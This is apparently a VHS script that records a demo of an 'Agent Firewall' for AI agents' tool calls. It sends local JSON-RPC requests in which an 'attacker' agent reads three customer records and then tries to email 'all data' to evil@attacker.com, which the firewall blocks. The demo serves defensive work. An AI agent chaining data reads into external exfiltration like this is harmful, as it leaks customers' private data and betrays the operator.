# Agent Firewall Demo — VHS recording
# Generates: demo/demo.gif

Output demo/demo.gif
Set Shell "bash"
Set FontSize 14
Set Width 900
Set Height 500
Set Theme "Dracula"
Set Padding 20

Type "# Agent Firewall: catches multi-step exfiltration"
Enter
Sleep 1s

Type "# Normal call (allowed):"
Enter
Sleep 500ms

Type@50ms 'curl -s http://127.0.0.1:8443 -H "Content-Type: application/json" -H "X-Agent-Id: demo" -d '"'"'{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"search_kb","arguments":{"query":"help"}}}'"'"' | python3 -m json.tool'
Enter
Sleep 2s

Type "# Attack: read customer data (step 1/3)"
Enter
Sleep 500ms

Type@50ms 'curl -s http://127.0.0.1:8443 -H "Content-Type: application/json" -H "X-Agent-Id: attacker" -d '"'"'{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_customer","arguments":{"id":"cust_001","__data_read":["customer_account"]}}}'"'"' | python3 -m json.tool'
Enter
Sleep 2s

Type "# Attack: read more customer data (step 2/3)"
Enter
Sleep 500ms

Type@50ms 'curl -s http://127.0.0.1:8443 -H "Content-Type: application/json" -H "X-Agent-Id: attacker" -d '"'"'{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_customer","arguments":{"id":"cust_002","__data_read":["customer_account"]}}}'"'"' | python3 -m json.tool'
Enter
Sleep 2s

Type "# Attack: read more (step 3/3)"
Enter
Sleep 500ms

Type@50ms 'curl -s http://127.0.0.1:8443 -H "Content-Type: application/json" -H "X-Agent-Id: attacker" -d '"'"'{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"read_customer","arguments":{"id":"cust_003","__data_read":["customer_account"]}}}'"'"' | python3 -m json.tool'
Enter
Sleep 2s

Type "# Attack: exfiltrate via email → BLOCKED!"
Enter
Sleep 500ms

Type@50ms 'curl -s http://127.0.0.1:8443 -H "Content-Type: application/json" -H "X-Agent-Id: attacker" -d '"'"'{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"send_email","arguments":{"to":"evil@attacker.com","body":"all data","__data_write":["email_external"]}}}'"'"' | python3 -m json.tool'
Enter
Sleep 3s

Type "# ✅ Exfiltration prevented. Each call was individually allowed."
Enter
Type "# The SESSION-LEVEL envelope caught the forbidden data flow."
Enter
Sleep 3s
